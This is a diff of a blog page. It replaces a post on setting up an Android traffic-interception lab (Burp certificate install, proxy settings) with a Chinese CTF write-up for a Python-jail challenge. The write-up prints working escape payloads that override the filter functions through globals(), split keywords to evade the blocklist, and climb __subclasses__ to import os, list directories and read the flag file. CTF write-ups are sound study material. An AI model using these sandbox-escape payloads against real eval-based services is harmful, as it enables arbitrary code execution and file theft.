@@ -22,7 +22,7 @@
 
   
 
-  <title>安卓渗透测试环境搭建 | Baron&#39;s Blog</title>
+  <title>wp-强网杯-Misc-PyjailmyReveng | Baron&#39;s Blog</title>
 
   
 
@@ -102,17 +102,12 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">安卓渗透测试环境搭建</h1>
+          <h1 class="title-wrap">wp-强网杯-Misc-PyjailmyReveng</h1>
           <h2 class="title-sub-wrap">
             <strong>Baron</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2023-10-03T05:34:18.118Z" itemprop="datePublished">2023-10-03</time>
+            <time  class="article-date" datetime="2023-12-18T07:03:03.000Z" itemprop="datePublished">2023-12-18</time>
           </h2>
-          
-            <h2 class="last-time">
-              <span>最后更新于</span>
-              <time  class="article-updated" datetime="2023-10-09T09:15:21.231Z" itemprop="dateUpdated">2023-10-09</time>
-            </h2>
           
           
           <ul class="wrap-list dark">
@@ -144,30 +139,29 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h1 id="安卓渗透测试环境搭建"><a href="#安卓渗透测试环境搭建" class="headerlink" title="安卓渗透测试环境搭建"></a>安卓渗透测试环境搭建</h1><h4 id="环境准备："><a href="#环境准备：" class="headerlink" title="环境准备："></a>环境准备：</h4><p>openssl：提供证书相关操作</p>
-<p>雷电模拟器：提供安卓环境</p>
-<p>Burpsuite：渗透测试抓包工具</p>
-<h4 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h4><h5 id="0x01-获得bp的证书"><a href="#0x01-获得bp的证书" class="headerlink" title="0x01 获得bp的证书"></a>0x01 获得bp的证书</h5><p>访问bp中设置的地址即可获得证书 cacert.der</p>
-<p><img src="/../images/image-20231003010552628.png" alt="image-20231003010552628"></p>
-<h5 id="0x02-转换证书为pem"><a href="#0x02-转换证书为pem" class="headerlink" title="0x02 转换证书为pem"></a>0x02 转换证书为pem</h5><p>计算hash值&amp;生成pem文件&amp;生成.0文件</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform der -in cacert.der -out cacert.pem</span><br><span class="line">生成pem文件</span><br><span class="line">openssl x509 -inform PEM -subject_hash_old -in cacert.pem</span><br><span class="line">第二条命令看得到的hash值，重命名pem文件为 得到的hash值.0</span><br></pre></td></tr></table></figure>
+        <h2 id="wp-强网杯-Misc-PyjailmyReveng"><a href="#wp-强网杯-Misc-PyjailmyReveng" class="headerlink" title="wp-强网杯-Misc-PyjailmyReveng"></a>wp-强网杯-Misc-PyjailmyReveng</h2><p>nc返回源码，进行代码审计，定位核心部分如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">in</span> input_code <span class="keyword">and</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> input_code <span class="keyword">and</span> input_code.**isascii**() <span class="keyword">and</span> **my_filter**(input_code) <span class="keyword">and</span> <span class="string">&quot;eval&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> input_code <span class="keyword">and</span> **<span class="built_in">len</span>**(input_code) &lt; <span class="number">65</span>:</span><br><span class="line">    input_code = <span class="built_in">eval</span>(<span class="string">f&quot;f&#x27;<span class="subst">&#123;input_code&#125;</span>&#x27;&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Player! Please obey the filter rules which I set!&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../images/image-20231003011744986.png" alt="image-20231003011744986"></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其实复制粘贴就行，只要终端输出的内容，终端运行一行代码就够了其实</span><br></pre></td></tr></table></figure>
+<p>eval执行我们恶意的payload，但是进行了过滤，分析代码过滤条件如下：</p>
+<p><strong>1、</strong>输入字符串是ASCII码表示的（即，不包含非ASCII字符）</p>
+<p><strong>2、</strong>my_filter函数过滤，详见源代码</p>
+<p><strong>3、</strong>字符串中不包含子字符串 <code>&quot;eval&quot;</code></p>
+<p><strong>4、</strong>len函数过滤，输入字符串的长度小于 65</p>
+<p>python函数绕过方法：</p>
+<p>1、加一对单引号绕过，例如 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">input</span>()----&gt;<span class="keyword">in</span><span class="string">&#x27;&#x27;</span>put()</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../images/image-20231003011906360.png" alt="image-20231003011906360"></p>
-<h5 id="0x03-导入证书"><a href="#0x03-导入证书" class="headerlink" title="0x03 导入证书"></a>0x03 导入证书</h5><p>i. 开启雷电模拟器的system可以写入权限和root权限（踩坑，一定记得开System.vmdk可以写入权限，不然导入不了证书，写入会被积极拒绝）【题外话：雷电模拟器也是为了加快运行才加了这个默认限制，大家轻一点喷】</p>
-<p><img src="/../images/image-20231003012501105.png" alt="image-20231003012501105"></p>
-<p>ii. 导入证书</p>
-<p>复制粘贴 Hash值.0文件到 &#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;。图里面是用的MT管理器，这里大家可以各显神通，adb shell传进去也行。</p>
-<p><img src="/../images/image-20231003012725150.png" alt="image-20231003012725150"></p>
-<h5 id="0x04-配置代理"><a href="#0x04-配置代理" class="headerlink" title="0x04 配置代理"></a>0x04 配置代理</h5><p>i. 在BP中绑定监听的IP（你主机有网的那个IP，不够严谨，初学者记得是有网的那个IP就行）。</p>
-<p><img src="/../images/image-20231003012127291.png" alt="image-20231003012127291"></p>
-<p>ii. 在手机系统设置中设置代理到，BP中设置的IP和端口即可。</p>
-<p><img src="/../images/image-20231003012252080.png" alt="image-20231003012252080"></p>
-<h5 id="0x05-Done-抓包测试"><a href="#0x05-Done-抓包测试" class="headerlink" title="0x05 Done - 抓包测试"></a>0x05 Done - 抓包测试</h5><p>这里演示一下抓包U净的接口</p>
-<p><img src="/../images/image-20231003013225392.png" alt="image-20231003013225392"></p>
-<p>到此就结束了，希望搭环境过程一路顺风。</p>
+<p>2、创建全局函数“重写”原始的函数，例如</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">globals</span>().update(<span class="built_in">dict</span>(my_filter=<span class="keyword">lambda</span> a:<span class="number">1</span>)) <span class="comment"># 实现“重写”my_filter 函数 x为传入的参数 1为函数的返回值</span></span><br><span class="line"><span class="built_in">globals</span>().update(<span class="built_in">dict</span>(<span class="built_in">len</span>=<span class="keyword">lambda</span> a:<span class="number">1</span>)) <span class="comment"># 实现“重写”len 函数 x为传入的参数 1为函数的返回值</span></span><br></pre></td></tr></table></figure>
+
+<p>因此要绕过上面的判断可以得出如下绕过方法：</p>
+<p>1、my_filter始终返回true 也就是1</p>
+<p>2、len函数始终返回 小于65的数字 如 1</p>
+<p>攻击的payload（listdir()函数）就通过<code>__class__</code>链条去获取即可</p>
+<p>得到最后的payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">第一次输入</span><br><span class="line">&#123;<span class="built_in">globals</span>().update(<span class="built_in">dict</span>(my_filter=<span class="keyword">lambda</span> a:<span class="number">1</span>))&#125;<span class="string">&#x27;&#x27;</span>&#123;<span class="keyword">in</span><span class="string">&#x27;&#x27;</span>put()&#125;<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">&#123;globals().update(dict(len=lambda a:1))&#125;&#x27;</span><span class="string">&#x27;&#123;in&#x27;</span><span class="string">&#x27;put()&#125;&#x27;</span><span class="comment">#</span></span><br><span class="line">&#123;<span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__())&#125;</span><br><span class="line">打印存在的<span class="keyword">class</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">第二次输入</span> 调用listdir()</span><br><span class="line">&#123;<span class="built_in">globals</span>().update(<span class="built_in">dict</span>(my_filter=<span class="keyword">lambda</span> a:<span class="number">1</span>))&#125;<span class="string">&#x27;&#x27;</span>&#123;<span class="keyword">in</span><span class="string">&#x27;&#x27;</span>put()&#125;<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">&#123;globals().update(dict(len=lambda a:1))&#125;&#x27;</span><span class="string">&#x27;&#123;in&#x27;</span><span class="string">&#x27;put()&#125;&#x27;</span><span class="comment">#</span></span><br><span class="line">&#123;<span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">137</span>].__init__.__globals__[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&quot;__import__&quot;</span>](<span class="string">&quot;os&quot;</span>).listdir())&#125;</span><br><span class="line"></span><br><span class="line">第三次输入</span><br><span class="line">&#123;<span class="built_in">globals</span>().update(<span class="built_in">dict</span>(my_filter=<span class="keyword">lambda</span> a:<span class="number">1</span>))&#125;<span class="string">&#x27;&#x27;</span>&#123;<span class="keyword">in</span><span class="string">&#x27;&#x27;</span>put()&#125;<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">&#123;globals().update(dict(len=lambda a:1))&#125;&#x27;</span><span class="string">&#x27;&#123;in&#x27;</span><span class="string">&#x27;put()&#125;&#x27;</span><span class="comment">#</span></span><br><span class="line">&#123;<span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&quot;flag_5D421370D9B97BF2B41F0B0DCF2F65FCB37B4B3FFD21EE040872D6A131447B14&quot;</span>).read())&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag~</p>
 
       </section>
 
@@ -175,28 +169,14 @@
       
         <nav class="article-nav">
           
-            <div class="article-nav-item layout-padding">
-  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
-    
-    <div class="card-text">
-      
-        <a href="/2023/10/03/%E5%9F%BA%E7%A1%80%E5%AE%9E%E9%AA%8C/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">基础实验</h2>
-        </a>
-      
-      <div class="card-text--row">Newer</div>
-    </div>
-  </article>
-</div>
-          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
     
     <div class="card-text">
       
-        <a href="/2023/10/03/hello-world/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">Hello World</h2>
+        <a href="/2023/12/18/wp-%E5%BC%BA%E7%BD%91%E6%9D%AF-Web-happy-game/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">强网杯-Web-happy_game</h2>
         </a>
       
       <div class="card-text--row">Older</div>
